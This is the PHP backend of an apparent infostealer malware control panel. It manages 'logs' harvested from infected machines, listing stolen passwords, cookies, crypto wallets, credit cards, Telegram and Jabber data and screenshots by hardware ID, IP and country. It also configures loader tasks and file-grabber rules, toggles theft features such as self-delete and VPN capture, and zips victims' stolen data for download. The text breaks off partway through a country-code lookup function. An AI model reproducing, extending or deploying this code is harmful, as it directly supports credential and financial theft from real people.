<?php
//ini_set('display_errors', 'On');
//error_reporting(E_ALL);
   include 'database.php';
if(isset($_POST['comment'])){
		$id = formatString($_POST['comment']);
		$text = formatString($_POST['text']);
		$pdoConnection->exec("UPDATE `logs` SET `comment` = '$text' WHERE `id` = '$id'");
}
if(isset($_POST['checked'])){
		$id = formatString($_POST['checked']);
		$pdoConnection->exec("UPDATE `logs` SET checked = 1 WHERE id = '$id'");
}
if(isset($_POST['delete'])){
		if($_POST['delete']=="loader"){
			$pdoConnection->exec("DELETE FROM `tasks` WHERE id = '" . formatString($_POST['id']) . "'");
		}
		if($_POST['delete']=="preset"){
			$pdoConnection->exec("DELETE FROM `presets` WHERE id = '" . formatString($_POST['id']) . "'");
		}
		if($_POST['delete']=="grabber"){
			$pdoConnection->exec("DELETE FROM `grabber` WHERE id = '" . formatString($_POST['id']) . "'");
		}
		if($_POST['delete']=="log"){
			if($_POST['id']=="all"){
				$ids = $pdoConnection->query("SELECT id FROM `logs` WHERE")->fetchAll();
			}else if($_POST['id']=="checked"){
				$ids = $pdoConnection->query("SELECT id FROM `logs` WHERE `checked` = 1")->fetchAll();
			}else if($_POST['id']=="empty"){
				$ids = $pdoConnection->query("SELECT id FROM `logs` WHERE `pswd` = 0 AND `cookie` = 0 AND `wallets` = 0")->fetchAll();
			}else{
				$id = $_POST['id'];
				$temp = explode(',',$id);
				for($i=0;$i<count($temp);$i++)
					$ids[$i]['id']=$temp[$i];
			}
		   for($i=0;$i<count($ids);$i++){
			   try{
			   $hwid = $pdoConnection->query("SELECT hwid FROM `logs` WHERE id = '" . formatString($ids[$i]['id']) . "'")->fetchColumn(0);
			   $hwidDir=$hwid."_".$ids[$i]['id'];
			   $dir = "logs/" . $hwidDir . "/";
			   if(strlen($dir)>6){
			   $it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
			   $files = new RecursiveIteratorIterator($it,
				   RecursiveIteratorIterator::CHILD_FIRST);
			   foreach ($files as $file) {
				   if ($file->isDir()) {
					   rmdir($file->getRealPath());
				   } else {
					   unlink($file->getRealPath());
				   }
			   }
			   rmdir($dir);  
			   }
			   } catch (Exception $ex) {
			   }
			   $pdoConnection->exec("DELETE FROM `logs` WHERE id = '" . $ids[$i]['id'] . "'");
			   }
	}
}
if(isset($_POST['submit'])){
		if($_POST['submit']=="loader"){
			$id = formatString($_POST["id"]);
			$name = formatString($_POST["name"]);
			$count = formatString($_POST["count"]);
			$country = formatString($_POST["country"]);
			$task = formatString($_POST["task"]);
			$preset = formatString($_POST["preset"]);
			if($_POST["pass"]=='true') $pass="on"; else $pass="off";
			if($_POST["cookie"]=='true')	$cookies="on"; else $cookies="off";
			if($_POST["wallet"]=='true')	$wallets="on"; else $wallets="off";
			if($_POST["jabb"]=='true')	$jabb="on"; else $jabb="off";
			if($_POST["tg"]=='true')	$tg="on"; else $tg="off";
			if($_POST["cc"]=='true')	$cc="on"; else $cc="off";
			$str = $pass.';'.$cookies.';'.$wallets.';'.$jabb.';'.$tg.';'.$cc;

			if ($name != null & $count != null & $country != null & $task != null) {
				if($id==""){
					$pdoConnection->exec("INSERT INTO `tasks`(`id`, `name`, `count`, `country`, `task`, `preset`,`params`,`status`) VALUES (null, '$name', '$count', '$country', '$task', '$preset','$str', 0)");
				}else{
					$pdoConnection->exec("UPDATE `tasks` SET `name`='$name', `count`='$count', `country`='$country', `task`='$task', `preset`='$preset',`params`='$str' WHERE id=$id");
				}
			}
		}
		if($_POST['submit']=="preset"){
			$id			= formatString($_POST["id"]);
			$name       = formatString($_POST["name"]);
			$color      = formatString($_POST["color"]);
			$pattern    = formatString($_POST["services"]);
			if ($color != null & $pattern != null) {
				if($id==""){
					$pdoConnection->exec("INSERT INTO `presets`(`name`,`color`,`pattern`) VALUES ('$name','$color','$pattern')");
				}else{
					$pdoConnection->exec("UPDATE `presets` SET `name`='$name', `color`='$color', `pattern`='$pattern' WHERE id=$id");
				}
				
			}
		}
		if($_POST['submit']=="grabber"){
			$id			= formatString($_POST["id"]);
			$name       = formatString($_POST["name"]);
			$folder      = formatString(addslashes($_POST["folder"]),false);
			$pattern    = formatString($_POST["pattern"]);
			$exception    = formatString($_POST["exception"]);
			if ($folder != null & $pattern != null& $name != null) {
				if($id==""){
					$pdoConnection->exec("INSERT INTO `grabber`(`name`,`folder`,`pattern`,`exception`) VALUES ('$name','$folder','$pattern','$exception')");
				}else{
					$pdoConnection->exec("UPDATE `grabber` SET `name`='$name', `folder`='$folder', `pattern`='$pattern', `exception`='$exception' WHERE id=$id");
				}
				var_dump($folder);
			}
		}
		if($_POST['submit']=="settings"){
			$cis    = formatString($_POST['cis']);
			$repeat = formatString($_POST['repeat']);
			$telegram = formatString($_POST['telegram']);
			$history = formatString($_POST['history']);
			$autocomplete = formatString($_POST['autocomplete']);
			$cards = formatString($_POST['cards']);
			$cookies = formatString($_POST['cookies']);
			$passwords = formatString($_POST['passwords']);
			$jabber = formatString($_POST['jabber']);
			$ftp = formatString($_POST['ftp']);
			$screenshot = formatString($_POST['screenshot']);
			$selfDelete = formatString($_POST['selfDelete']);
			$vpn = formatString($_POST['vpn']);
			$grabber = formatString($_POST['grabber']);
			$executionTime = formatString($_POST['executionTime']);
			if ($cis == NULL)
				$cis = "off";
			if ($repeat == NULL)
				$repeat = "off";
			 if ($telegram == NULL)
				$telegram = "off";
			if ($history == NULL)
				$history = "off";
			 if ($autocomplete == NULL)
				$autocomplete = "off";
			if ($cards == NULL)
				$cards = "off";
			 if ($cookies == NULL)
				$cookies = "off";
			if ($passwords == NULL)
				$passwords = "off";
			 if ($jabber == NULL)
				$jabber = "off";
			if ($ftp == NULL)
				$ftp = "off";
			 if ($screenshot == NULL)
				$screenshot = "off";
			if ($selfDelete == NULL)
				$selfDelete = "off";
			 if ($vpn == NULL)
				$vpn = "off";
			if ($grabber == NULL)
				$grabber = "off";
			$pdoConnection->query("UPDATE `settings` SET cisLogs='$cis',repeatLogs='$repeat',telegram='$telegram',history='$history',autocomplete='$history',cards='$cards',cookies='$cookies',passwords='$passwords',jabber='$jabber',ftp='$ftp',screenshot='$screenshot',selfDelete='$selfDelete',vpn='$vpn',grabber='$grabber',executionTime='$executionTime'");
		}		
}
if(isset($_POST['update'])){
		if($_POST['update']=="loader"){
				$tasks = $pdoConnection->query("SELECT * FROM `tasks`");
				while ($task = $tasks->fetch(PDO::FETCH_ASSOC)) {
					if ($task["status"] < $task["count"]) {
						$status = "<button type=\"button\" class=\"btn btn-warning btn-sm\">" . $task["status"] . " \\ " . $task["count"] . "</button>";
					} else if ($task["count"] == 0) {
						$status = "<button type=\"button\" class=\"btn btn-info btn-sm\">∞</button>";
					} else {
						$status = "<button type=\"button\" class=\"btn btn-success btn-sm\">Finished</button>";
					}
					?>
					<tr id="task<?php echo $task['id']; ?>">
						<th style="display:none;"><?php  echo $task["id"]; ?></th>
						<th><?php  echo $task["preset"]; ?></th>
						<th><?php  echo $task["name"]; ?></th>
						<th><?php  echo $task["params"]; ?></th>
						<th><?php  echo $task["count"]; ?></th>
						<th><?php  echo $task["country"]; ?></th>
						<th><?php  echo $task["task"]; ?></th>
						<th><?php  echo $status ?></th>
						<th><a onclick="editLoader(<?php  echo $task["id"]; ?>)">
								<button type="button" class="btn btn-warning btn-sm">Edit</button>
							</a><a onclick="deleteLoader(<?php  echo $task["id"]; ?>)">
								<button type="button" class="btn btn-danger btn-sm">Delete</button>
							</a></th>
					</tr>
<?php
				}			
		}
		if($_POST['update']=="preset"){
			$presets = $pdoConnection->query("SELECT * FROM `presets`");
			while ($preset = $presets->fetch(PDO::FETCH_ASSOC))
				{
				
				?>
					<tr id="preset<?php echo $preset['id']; ?>">
						<td><b>#<?php   echo $preset["name"]; ?></b></td>
						<td style="word-break: break-all;"><?php   echo $preset["pattern"]; ?></td>
						<td style="color: <?php   echo $preset["color"]; ?>"><?php   echo $preset["color"]; ?></td>
						<td><a href="#!" onclick="editPreset(<?php  echo $preset["id"]; ?>)">
								Edit
							</a><a href="#!" onclick="deletePreset(<?php  echo $preset["id"]; ?>)">
								Delete
							</a></td>
					</tr>
					
				<?php  
				}
		}
		if($_POST['update']=="grabber"){
			$grabberRules = $pdoConnection->query("SELECT * FROM `grabber`");
			while ($grabberRule = $grabberRules->fetch(PDO::FETCH_ASSOC))
			{
			?>
				<tr id="grabber<?php echo $grabberRule['id']; ?>">
					<td><b><?php   echo $grabberRule["name"]; ?></b></td>
					<td style="word-break: break-all;"><?php   echo $grabberRule["folder"]; ?></td>
					<td style="word-break: break-all;"><?php   echo $grabberRule["pattern"]; ?></td>
					<td style="word-break: break-all;"><?php   echo $grabberRule["exception"]; ?></td>
					<td><a href="#!" onclick="editGrabber(<?php  echo $grabberRule["id"]; ?>)">
								Edit
							</a><a href="#!" onclick="deleteGrabber(<?php  echo $grabberRule["id"]; ?>)">
								Delete
							</a></td>
				</tr>
				
			<?php  
			}
		}
}
if(isset($_POST['download'])){
	$id = $_POST['id'];
	if($_POST['download']=="log"){
		$hwid = $pdoConnection->query("SELECT hwid FROM `logs` WHERE id = '$id'")->fetchColumn(0);
		$ip = $pdoConnection->query("SELECT ip FROM `logs` WHERE id = '$id'")->fetchColumn(0);
		$country = $pdoConnection->query("SELECT country FROM `logs` WHERE id = '$id'")->fetchColumn(0);
		$datee = $pdoConnection->query("SELECT date FROM `logs` WHERE id = '$id'")->fetchColumn(0);
		$str          = date("d.m.Y_H:i:s", $datee) . "_" . $country . "_" . $ip . "_" . $hwid;
		$txt = $str. ".zip";
		$hwidDir=$hwid."_".$id;
		$rootPath = realpath("logs/" . $hwidDir . "/");
		$zip = new ZipArchive();
		$zip->open($txt, ZipArchive::CREATE | ZipArchive::OVERWRITE);
		//$zip->setArchiveComment(file_get_contents("logs/" . $hwidDir . "/information.log"));
		$files = new RecursiveIteratorIterator(
           new RecursiveDirectoryIterator($rootPath),
           RecursiveIteratorIterator::LEAVES_ONLY
       );
       foreach ($files as $name => $file) {
           if (!$file->isDir()) {
               $filePath = $file->getRealPath();
               
				$relativePath = substr($filePath, strlen($rootPath) + 1);
				$zip->addFile($filePath, $relativePath);
           }
       }
   
       $zip->close();
	   $pdoConnection->query("UPDATE `logs` SET `checked` = '1' WHERE `hwid` = '$hwid'");
       echo $txt;
	}
	if($_POST['download']=="logs"){
        if($id=="all"||$id=="unchecked"){
            $txt    = "all" . date(" d.m.Y_H:i:s") . ".zip";
            file_put_contents('u',$txt);
            $zipAll = new ZipArchive();
            $zipAll->open($txt, ZipArchive::CREATE | ZipArchive::OVERWRITE);
            if($id=="unchecked"){
                $pc = $pdoConnection->query("SELECT id, hwid, ip, country FROM `logs` WHERE `checked` = 0")->fetchAll();
            }else{
                $pc = $pdoConnection->query("SELECT id, hwid, ip, country, date FROM `logs`")->fetchAll();
            }
            for ($i = 0; $i < count($pc)-1; $i++) {
                $hwidDir=$pc[$i]["hwid"]."_".$pc[$i]['id'];
                $rootPath = realpath("logs/" . $hwidDir . "/");
                if($rootPath===false) continue;
                $files    = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY);
                foreach ($files as $name => $file) {

                    if (!$file->isDir()) {
                        $filePath     = $file->getRealPath();
                        $str          = date("d.m.Y_H:i:s", $pc[$i]["date"]) . "_" . $pc[$i]["country"] . "_" . $pc[$i]["ip"] . "_" . $pc[$i]["hwid"];
                        $relativePath = substr($filePath, strlen($rootPath) + 1);
                        $zipAll->addFile($filePath, $str . "/" . $relativePath);
                    }
                }
                $pdoConnection->query("UPDATE `logs` SET `checked` = 1 WHERE `hwid` = '" . $pc[$i]["hwid"]."'");
            }
            $zipAll->close();
            echo $txt;
        }else {
            $ids = explode(',', $id);
            $txt = (count($ids)) . " Logs " . date("d.m.Y_H:i:s") . ".zip";
            $zipAll = new ZipArchive();
            $zipAll->open($txt, ZipArchive::CREATE | ZipArchive::OVERWRITE);
            for ($i = 0; $i < count($ids); $i++) {
                $pc = $pdoConnection->query("SELECT hwid, ip, country, date FROM `logs` WHERE `id`=" . $ids[$i])->fetch(PDO::FETCH_ASSOC);
                $hwidDir = $pc["hwid"] . "_" . $ids[$i];
                $rootPath = realpath("logs/" . $hwidDir . "/");
                if (file_exists($rootPath)) {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY);

                    foreach ($files as $name => $file) {
                        if (!$file->isDir()) {
                            $filePath = $file->getRealPath();
                            $str = date("d.m.Y_H:i:s", $pc["date"]) . "_" . $pc["country"] . "_" . $pc["ip"] . "_" . $pc["hwid"];
                            $relativePath = substr($filePath, strlen($rootPath) + 1);
                            $zipAll->addFile($filePath, $str . "/" . $relativePath);
                        }
                    }
                    $pdoConnection->query("UPDATE `logs` SET `checked` = 1 WHERE `hwid` = '" . $pc["hwid"] . "'");
                }
            }
            $zipAll->close();
            echo $txt;
        }
	}


	/*if($_POST['download']=="all"){
		$txt    = "logs/all" . date(" d.m.Y_H:i:s") . ".zip";
        file_put_contents('u',$txt);
        $zipAll = new ZipArchive();
        $zipAll->open($txt, ZipArchive::CREATE | ZipArchive::OVERWRITE);
        if($id=="unchecked"){
			$pc = $pdoConnection->query("SELECT id, hwid, ip, country FROM `logs` WHERE `checked` = 0")->fetchAll();
		}else{
			$pc = $pdoConnection->query("SELECT id, hwid, ip, country, date FROM `logs`")->fetchAll();
		}
        for ($i = 0; $i < count($pc)-1; $i++) {
			$hwidDir=$pc[$i]["hwid"]."_".$pc[$i]['id'];
            $rootPath = realpath("logs/" . $hwidDir . "/");
            $files    = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY);
            foreach ($files as $name => $file) {
                if (!$file->isDir()) {
                    $filePath     = $file->getRealPath();
                    $str          = date("d.m.Y_H:i:s", $pc[$i]["date"]) . "_" . $pc[$i]["country"] . "_" . $pc[$i]["ip"] . "_" . $pc[$i]["hwid"];
					$relativePath = substr($filePath, strlen($rootPath) + 1);
					$zipAll->addFile($filePath, $str . "/" . $relativePath);
                }
            }
            $pdoConnection->query("UPDATE `logs` SET `checked` = 1 WHERE `hwid` = '" . $pc[$i]["hwid"]."'");
        }
        $zipAll->close();
        echo $txt;
	}*/
}if(isset($_POST['search'])){
		if(isset($_POST["search_id"])) $search_id = formatString($_POST["search_id"]); 			else $search_id=false;
		if(isset($_POST["search_type"])) $search_type = formatString($_POST["search_type"]); 			else $search_type=false;
		if(isset($_POST["search_pass"])) $search_pass = formatString($_POST["search_pass"]);			else $search_pass=false;
		if(isset($_POST["search_cookie"])) $search_cookie = formatString($_POST["search_cookie"]);		else $search_cookie=false;
		if(isset($_POST["search_wallet"])) $search_wallet = formatString($_POST["search_wallet"]);		else $search_wallet=false;
		if(isset($_POST["search_comment"])) $search_comment = formatString($_POST["search_comment"]);			else $search_commet=false;
		if(isset($_POST["search_country"])) $search_country = formatString($_POST["search_country"]);	else $search_country=false;
		if(isset($_POST["search_in_passwords"])) $parser_link = formatString($_POST["search_in_passwords"]); else $parser_link=false;
		if(isset($_POST["search_in_cookies"])) $parser_cookie = formatString($_POST["search_in_cookies"]); else $parser_cookie=false;
		if(isset($_POST["search_cc"])) $search_cc = formatString($_POST["search_cc"]); else $search_cc=false;
		if(isset($_POST["search_jabb"])) $search_jabb = formatString($_POST["search_jabb"]); else $search_jabb=false;
		if(isset($_POST["search_tg"])) $search_tg = formatString($_POST["search_tg"]); else $search_tg=false;
		if(isset($_POST["search_unchecked"])) $search_unchecked = formatString($_POST["search_unchecked"]); else $search_unchecked=false;
		$filter_id = "";
		$filter_pass = "";
		$filter_comment = "";
		$filter_cookie = "";
		$filter_wallet = "";
		$filter_country = "";
		$filter_unchecked = "";
		if($search_pass=="on") $filter_pass = " AND `pswd`>0 ";
		if($search_cookie=="on") $filter_cookie = " AND `cookie`>0 ";
		if($search_wallet=="on") $filter_wallet = " AND `wallets`>0 ";
		if($search_cc=="on") $filter_cc = " AND `credit`>0 ";
		if($search_id!=="all") $filter_id = " AND `userID`='$search_id'";
		if($search_country) $filter_country = " AND `country` LIKE '%$search_country%' ";
		if($search_comment) $filter_comment = " AND `comment` LIKE '%$search_comment%' ";
		if($search_unchecked) $filter_unchecked = " AND `checked` = '0' ";
		$bots = $pdoConnection->query("SELECT * FROM `logs` WHERE 1=1 $filter_id $filter_pass $filter_cookie $filter_wallet $filter_comment $filter_country $filter_unchecked ORDER BY `id` DESC")->fetchAll(PDO::FETCH_ASSOC);
		$i=0;
						foreach($bots as $bot) {
							$hwidDir=$bot["hwid"]."_".$bot["id"];
							if($search_jabb=="on"){
								$fname = "logs/" . $hwidDir . "/jabber";
								if (!file_exists($fname)) continue;
							}
							if($search_tg=="on"){
								$fname = "logs/" . $hwidDir . "/Telegram";
								if (!file_exists($fname)) continue;
							}
							
							if($parser_link!==""){
								$fname = "logs/" . $hwidDir . "/"."passwords.log";
								if (!file_exists($fname)) continue;
								$domains = explode(';', $parser_link);
								$cnt = 0;
								$content = file_get_contents($fname);
								foreach($domains as $dom) {
                                    if (strripos($content, $dom)) $cnt++;
                                }
								//if (strripos(file_get_contents($fname), $parser_link)===false) continue;
                                if($cnt == 0) continue;
							}
							if($parser_cookie!==""){
								$fname = "logs/" . $hwidDir . "/"."domains.log";
								if (!file_exists($fname)) continue;
                                $domains = explode(';', $parser_cookie);
                                $cnt = 0;
                                $content = file_get_contents($fname);
                                foreach($domains as $dom) {
                                    if (strripos($content, $dom)) $cnt++;
                                }
                                //if (strripos(file_get_contents($fname), $parser_cookie)===false) continue;
                                if($cnt == 0) continue;
							}
							if($search_type!==false){
								$presetKey='';
								$b=0;
								if($search_type!=="all"){
								$presetsArray = $pdoConnection->query("SELECT id,color,pattern,name FROM `presets` WHERE name='$search_type'")->fetch();
								$siteFinded = explode(";",$presetsArray['pattern']);
								foreach($siteFinded as $key){
									if(file_exists("logs/" . $hwidDir . "/" . "passwords.log")){
									if (strripos(file_get_contents("logs/" . $hwidDir . "/" . "passwords.log"), $key)!==false) {
									if($b==0){$presetKey.='<br><br>';$b++;}
									$presetKey.='<small><span style="display:inline;color:'.$presetsArray[1].';"><i
									class="fas fa-key"></i>'.$key.'&nbsp;</span></small>';
									}
									}
									if(file_exists("logs/" . $hwidDir . "/" . "domains.log")){
									if (strripos(file_get_contents("logs/" . $hwidDir . "/" . "domains.log"), $key)!==false) {
									if($b==0){$presetKey.='<br><br>';$b++;}
									$presetKey.='<small><span style="display:inline;color:'.$presetsArray[1].';"><i
									class="fas fa-cookie"></i>'.$key.'&nbsp;</span></small>';
									}
									}
								}
								if($presetKey=='') continue;
								}else{
								$presetsArray = $pdoConnection->query("SELECT id,color,pattern,name FROM `presets`");
								while($presetArray=$presetsArray->fetch()){
								$siteFinded = explode(";",$presetArray[2]);
								foreach($siteFinded as $key){
								if(file_exists("logs/" . $hwidDir . "/" . "passwords.log")){
									if (strripos(file_get_contents("logs/" . $hwidDir . "/" . "passwords.log"), $key)!==false) {
									if($b==0){$presetKey.='<br><br>';$b++;}
									$presetKey.='<small><span style="display:inline;color:'.$presetArray[1].';"><i
									class="fas fa-key"></i>'.$key.'&nbsp;</span></small>';
									}
									}
									if(file_exists("logs/" . $hwidDir . "/" . "cookieDomains.log")){
									if (strripos(file_get_contents("logs/" . $hwidDir . "/" . "cookieDomains.log"), $key)!==false) {
									if($b==0){$presetKey.='<br><br>';$b++;}
									$presetKey.='<small><span style="display:inline;color:'.$presetArray[1].';"><i
									class="fas fa-cookie"></i>'.$key.'&nbsp;</span></small>';
									}
									}
							 }
							 }
							}
							}
							$i++;
								?>
								<tr id="<?php  echo $bot['id'];?>table">
						 
						 <td style="display:none;" data-order="<?php echo $bot['userID'];?>"><button type="button" class="btn <?php if($bot['checked']=="1")echo "btn-success"; else echo "btn-danger";?> btn-sm"><?php echo $bot['userID']?></button></td>

									<td data-order="<?php echo intval($bot["pswd"]);?>">
                                       <span style="display: inline;"><i
                                          class="fas fa-key"></i><b><?php  echo $bot["pswd"]; ?> </b></span>
                                       <span style="display: inline;"><i
                                          class="fas fa-credit-card"></i><b> <?php  echo $bot["credit"]; ?></b> </span>
                                       <span style="display: inline;"><i class="fas fa-cookie"></i></i>
                                       <b> <?php  echo $bot["cookie"]; ?> </b></span>
                                       <span style="display: inline;"><i class="fas fa-clipboard-list"></i></i>
                                       <b> <?php  echo $bot["autofill"]; ?> </b></span>
                                       <span style="display: inline;"><i class="fas fa-wallet"></i></i>
                                       <b><?php  echo $bot["wallets"]; ?> </b></span>
                                       <span style="display: inline;"><i class="fas fa-file"></i></i>
                                       <b> <?php  echo $bot["count"]; ?> </b></span>
									   <?php 
										echo $presetKey;
										?>
                                    </td>
                                    <td><b><?php  echo $bot["hwid"]; ?></b><br>
                                       <small class="u-block u-text-mute"><?php  echo $bot["system"]; ?></small>
                                    </td>
                                    <td><b><?php  echo $bot["ip"]; ?></b><br>
                                       <small class="u-block u-text-mute"><?php  echo countryCodeToCountry($bot["country"]); ?></small>
                                    </td>
                                    <td data-order="<?php echo $bot["date"];?>"><b><?php  echo date("d/m/Y H:i:s",$bot["date"]);											?></b></td>
							<td><b><?php  echo $bot["buildversion"]; ?></b></td>
							<td><a class="image-link" href="<?php  echo "logs/" . $hwidDir . "/screen.jpeg"; ?>"><img
							   src=<?php  echo "logs/" . $hwidDir . "/screen.jpeg"; ?>></a></td>
							  
							   <td>
							   <form>
							   <div class="input-group">
									<input name = "comment" type="text" value="<?php echo $bot['comment'];?>" class="form-control"></input>
									<button type="button" onclick="changeComment(<?php echo $bot['id'];?>)" class="btn btn-success btn-sm">
									<span class="fas fa-save"></span></button>
								</div> 
								</form>
							   </td>
							<td>
							   <div class="btn-group">
								  <button type="button" class="btn btn-info dropdown-toggle btn-sm"
									 data-toggle="dropdown" aria-haspopup="true"
									 aria-expanded="false">Actions
								  </button>
								  <div class="dropdown-menu">
									 <a class="dropdown-item" href="#!" onclick="downloadFile('<?php  echo $bot["id"]; ?>')">Download</a>
									  <a class="dropdown-item" href="#!" onclick="viewInfo('passwords',<?php  echo $bot["id"]; ?>)">View passwords</a>
									   <a class="dropdown-item" href="#!" onclick="viewInfo('browsers',<?php  echo $bot["id"]; ?>)">View browsers</a>
									 <a class="dropdown-item" href="#!" onclick="markAsChecked('<?php  echo $bot["id"]; ?>')">Mark as checked</a>
									 <a class="dropdown-item" href="#!" onclick="deleteTable('<?php  echo $bot["id"]; ?>')">Delete</a>
								  </div>
							   </div>
							</td>
						 </tr>
						 <?php
		}
		echo "<a id='counter' href='#'>Printed $i logs</a>";
}


if(isset($_POST['main_page'])){
							$bots = $pdoConnection->query("SELECT * FROM `logs` ORDER BY `id` DESC")->fetchAll(PDO::FETCH_ASSOC);
							$i=0;
							foreach($bots as $bot) {
								$hwidDir=$bot["hwid"]."_".$bot["id"];
									$presetKey='';
									$presetsArray = $pdoConnection->query("SELECT id,color,pattern,name FROM `presets` WHERE name='$search_type'")->fetch();
									$siteFinded = explode(";",$presetsArray['pattern']);
									foreach($siteFinded as $key){
										if(file_exists("logs/" . $hwidDir . "/" . "passwords.log")){
										if (strripos(file_get_contents("logs/" . $hwidDir . "/" . "passwords.log"), $key)!==false) {
										if($b==0){$presetKey.='<br><br>';$b++;}
										$presetKey.='<small><span style="display:inline;color:'.$presetsArray[1].';"><i
										class="fas fa-key"></i>'.$key.'&nbsp;</span></small>';
										}
										}
										if(file_exists("logs/" . $hwidDir . "/" . "cookieDomains.log")){
										if (strripos(file_get_contents("logs/" . $hwidDir . "/" . "cookieDomains.log"), $key)!==false) {
										if($b==0){$presetKey.='<br><br>';$b++;}
										$presetKey.='<small><span style="display:inline;color:'.$presetsArray[1].';"><i
										class="fas fa-cookie"></i>'.$key.'&nbsp;</span></small>';
										}
										}
									}
									$i++;
                                        ?>
										<tr id="<?php  echo $bot['id'];?>table">

								 <td style="display:none;" data-order="<?php echo $bot['userID'];?>"><button type="button" class="btn <?php if($bot['checked']=="1")echo "btn-success"; else echo "btn-danger";?> btn-sm"><?php echo $bot['userID']?></button></td>

									<td data-order="<?php echo intval($bot["pswd"]);?>">
                                       <span style="display: inline;"><i
                                          class="fas fa-key"></i><b><?php  echo $bot["pswd"]; ?> </b></span>
                                       <span style="display: inline;"><i
                                          class="fas fa-credit-card"></i><b> <?php  echo $bot["credit"]; ?></b> </span>
                                       <span style="display: inline;"><i class="fas fa-cookie"></i></i>
                                       <b> <?php  echo $bot["cookie"]; ?> </b></span>
                                       <span style="display: inline;"><i class="fas fa-clipboard-list"></i></i>
                                       <b> <?php  echo $bot["autofill"]; ?> </b></span>
                                       <span style="display: inline;"><i class="fas fa-wallet"></i></i>
                                       <b><?php  echo $bot["wallets"]; ?> </b></span>
                                       <span style="display: inline;"><i class="fas fa-file"></i></i>
                                       <b> <?php  echo $bot["count"]; ?> </b></span>
                                        <?php
                                            if($bot['steam'] == 1)echo "<br><br><b class=\" rounded bg-dark text-white\">Steam</b>"
                                        ?>
									   <?php 
										echo $presetKey;
										?>
                                    </td>
                                    <td><b><?php  echo $bot["hwid"]; ?></b><br>
                                       <small class="u-block u-text-mute"><?php  echo $bot["system"]; ?></small>
                                    </td>
                                    <td><b><?php  echo $bot["ip"]; ?></b><br>
                                       <small class="u-block u-text-mute"><?php  echo countryCodeToCountry($bot["country"]); ?></small>
                                    </td>
                                    <td data-order="<?php echo $bot["date"];?>"><b><?php  echo date("d/m/Y H:i:s",$bot["date"]);											?></b></td>
                                    <td><b><?php  echo $bot["buildversion"]; ?></b></td>
                                    <td><a class="image-link" href="<?php  echo "logs/" . $hwidDir . "/screen.jpeg"; ?>"><img
                                       src=<?php  echo "logs/" . $hwidDir . "/screen.jpeg"; ?>></a></td>
									  
									   <td>
									   <form>
									   <div class="input-group">
											<input name = "comment" type="text" value="<?php echo $bot['comment'];?>" class="form-control"></input>
											<button type="button" onclick="changeComment(<?php echo $bot['id'];?>)" class="btn btn-success btn-sm">
											<span class="fas "></span>Save</button>
										</div> 
										</form>
									   </td>
                                    <td>
                                       <div class="btn-group">
                                          <button type="button" class="btn btn-info dropdown-toggle btn-sm"
                                             data-toggle="dropdown" aria-haspopup="true"
                                             aria-expanded="false">
                                          </button>
                                          <div class="dropdown-menu">
                                             <a class="dropdown-item" href="#!" onclick="downloadFile('<?php  echo $bot["id"]; ?>')">Download</a>
											  <a class="dropdown-item" href="#!" onclick="viewInfo('passwords',<?php  echo $bot["id"]; ?>)">View passwords</a>
											   <a class="dropdown-item" href="#!" onclick="viewInfo('browsers',<?php  echo $bot["id"]; ?>)">View info</a>
											 <a class="dropdown-item" href="#!" onclick="markAsChecked('<?php  echo $bot["id"]; ?>')">Mark as checked</a>
                                             <a class="dropdown-item" href="#!" onclick="deleteTable('<?php  echo $bot["id"]; ?>')">Delete</a>
                                          </div>
                                       </div>
                                    </td>
                                 </tr>
								 <?php
		}
		echo "<a id='counter' href='#'>Printed $i logs</a>";
}

function formatString($param,$slashes = true)
{
   $returnString = $param;
   $returnString = trim($returnString);
   if($slashes) $returnString = stripslashes($returnString);
   $returnString = htmlspecialchars($returnString);

   return $returnString;
}
function countryCodeToCountry($code) {
$code = strtoupper($code);
if ($code == 'AF') return 'Afghanistan';
if ($code == 'AX') return 'Aland Islands';
if ($code == 'AL') return 'Albania';
if ($code == 'DZ') return 'Algeria';
if ($code == 'AS') return 'American Samoa';
if ($code == 'AD') return 'Andorra';
if ($code == 'AO') return 'Angola';
if ($code == 'AI') return 'Anguilla';
if ($code == 'AQ') return 'Antarctica';
if ($code == 'AG') return 'Antigua and Barbuda';
if ($code == 'AR') return 'Argentina';
if ($code == 'AM') return 'Armenia';
if ($code == 'AW') return 'Aruba';
if ($code == 'AU') return 'Australia';
if ($code == 'AT') return 'Austria';
if ($code == 'AZ') return 'Azerbaijan';
if ($code == 'BS') return 'Bahamas the';
if ($code == 'BH') return 'Bahrain';
if ($code == 'BD') return 'Bangladesh';
if ($code == 'BB') return 'Barbados';
if ($code == 'BY') return 'Belarus';
if ($code == 'BE') return 'Belgium';
if ($code == 'BZ') return 'Belize';
if ($code == 'BJ') return 'Benin';
if ($code == 'BM') return 'Bermuda';
if ($code == 'BT') return 'Bhutan';
if ($code == 'BO') return 'Bolivia';
if ($code == 'BA') return 'Bosnia and Herzegovina';
if ($code == 'BW') return 'Botswana';
if ($code == 'BV') return 'Bouvet Island (Bouvetoya)';
if ($code == 'BR') return 'Brazil';
if ($code == 'IO') return 'British Indian Ocean Territory (Chagos Archipelago)';
if ($code == 'VG') return 'British Virgin Islands';
if ($code == 'BN') return 'Brunei Darussalam';
if ($code == 'BG') return 'Bulgaria';
if ($code == 'BF') return 'Burkina Faso';
if ($code == 'BI') return 'Burundi';
if ($code == 'KH') return 'Cambodia';
if ($code == 'CM') return 'Cameroon';
if ($code == 'CA') return 'Canada';
if ($code == 'CV') return 'Cape Verde';
if ($code == 'KY') return 'Cayman Islands';
if ($code == 'CF') return 'Central African Republic';
if ($code == 'TD') return 'Chad';
if ($code == 'CL') return 'Chile';
if ($code == 'CN') return 'China';
if ($code == 'CX') return 'Christmas Island';
if ($code == 'CC') return 'Cocos (Keeling) Islands';
if ($code == 'CO') return 'Colombia';
if ($code == 'KM') return 'Comoros the';
if ($code == 'CD') return 'Congo';
if ($code == 'CG') return 'Congo the';
if ($code == 'CK') return 'Cook Islands';
if ($code == 'CR') return 'Costa Rica';
if ($code == 'CI') return 'Cote d\'Ivoire';
if ($code == 'HR') return 'Croatia';
if ($code == 'CU') return 'Cuba';
if ($code == 'CY') return 'Cyprus';
if ($code == 'CZ') return 'Czech Republic';
if ($code == 'DK') return 'Denmark';
if ($code == 'DJ') return 'Djibouti';
